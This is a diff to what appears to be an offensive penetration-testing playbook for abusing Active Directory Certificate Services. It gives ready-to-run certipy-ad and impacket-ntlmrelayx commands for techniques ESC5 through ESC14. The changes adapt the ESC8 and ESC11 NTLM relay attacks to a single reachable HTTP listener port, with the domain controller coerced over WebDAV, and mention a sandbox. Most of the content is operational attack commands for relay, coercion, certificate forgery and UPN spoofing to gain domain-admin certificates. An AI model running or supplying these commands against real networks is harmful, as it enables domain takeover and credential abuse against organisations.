@@ -53,10 +53,10 @@ certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
 | **ESC5** | Vulnerable ACLs on a CA / PKI object in AD | Domain user | Modify CA ACL via `bloodyAD` or `impacket-dacledit` to grant yourself enrollment rights |
 | **ESC6** | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` set | Domain user with enroll rights on ANY auth-template | Submit cert request with custom SAN via `certipy-ad req -template Generic -upn admin@$DOMAIN -sid <admin-SID>` (note: ESC6 was patched in May 2022 by default) |
 | **ESC7** | Low-priv user has `ManageCA` or `ManageCertificates` rights | Same | Add yourself as Officer; approve a previously-denied request: `certipy-ad ca -ca CAName -add-officer $USER`, then `certipy-ad ca -ca CAName -issue-request <id>` |
-| **ESC8** | NTLM Relay to AD-CS Web Enrollment (`http://CA/certsrv/certfnsh.asp`) | Reachable web enrollment + coerced NTLM auth | `impacket-ntlmrelayx --target http://CA/certsrv/certfnsh.asp -smb2support --adcs --template <T>`; coerce a privileged machine via PetitPotam / DFSCoerce / PrinterBug |
+| **ESC8** | NTLM Relay to AD-CS Web Enrollment (`http://CA/certsrv/certfnsh.asp`) | Reachable web enrollment + coerced NTLM auth | `impacket-ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template <T> --http-port <LISTEN_PORT> --no-smb-server`; coerce a privileged machine over WebDAV to your one reachable port (see ESC8 below) |
 | **ESC9** | Template with `no security extension` flag (UPN ignored, only DNS) + UPN-write on a target | Same as ESC1 + UPN write rights | Set victim's `userPrincipalName` to admin's UPN, request cert, restore UPN |
 | **ESC10** | Weak `StrongCertificateBindingEnforcement` registry config + UPN-write or other identity-mapping abuse | Same | Hash collision on identity mapping; chain to KDC validation gap (CVE-2022-34691 family) |
-| **ESC11** | NTLM relay to ICPR RPC (port 135 / dynamic) without `EnforceEncryptionForRequests` | Same as ESC8 but RPC instead of HTTP | `impacket-ntlmrelayx --target rpc://CA -rpc-mode ICPR --adcs --template <T>` |
+| **ESC11** | NTLM relay to ICPR RPC (port 135 / dynamic) without `EnforceEncryptionForRequests` | Same as ESC8 but RPC instead of HTTP | `impacket-ntlmrelayx --target rpc://CA -rpc-mode ICPR --adcs --template <T> --http-port <LISTEN_PORT> --no-smb-server` (the callback still arrives over HTTP on your one port) |
 | **ESC12** | YubiHSM / shell access to CA host | Local admin on CA | Read CA private key via the YubiHSM session; forge any cert |
 | **ESC13** | Template with `Issuance Policy` linked to an OID that maps to a domain group | Same as ESC1 | Request cert with the issuance policy; cert grants implicit group membership at PKINIT auth |
 | **ESC14** | DNS-name override / `userCertificate` weak validation | Same as ESC10 family | Subset of identity-mapping abuse |
@@ -219,10 +219,16 @@ Family of attacks chaining UPN / DNS-name confusion with weakened `StrongCertifi
 
 ### ESC11 (NTLM Relay to ICPR RPC)
 
+Only the relay TARGET is RPC: the DC's coerced authentication must still reach ntlmrelayx, and
+the ESC8 warning applies unchanged. No SMB callback can arrive, so the listener is HTTP on your
+one reachable port and the DC is coerced over WebDAV exactly as in ESC8. With no reachable
+inbound port this attack is not possible from the sandbox.
+
 ```bash
-impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR \
-  --adcs --template DomainController -smb2support
-# Coerce as in ESC8
+# LISTEN_PORT = the pool port, or 4444 with a tunnel (see ESC8).
+impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR --adcs --template DomainController \
+  --http-port $LISTEN_PORT --no-smb-server
+# Coerce as in ESC8: LISTENER=<lhost-name>@<LPORT>/x
 ```
 
 ### ESC13 (Issuance Policy -> implicit group)
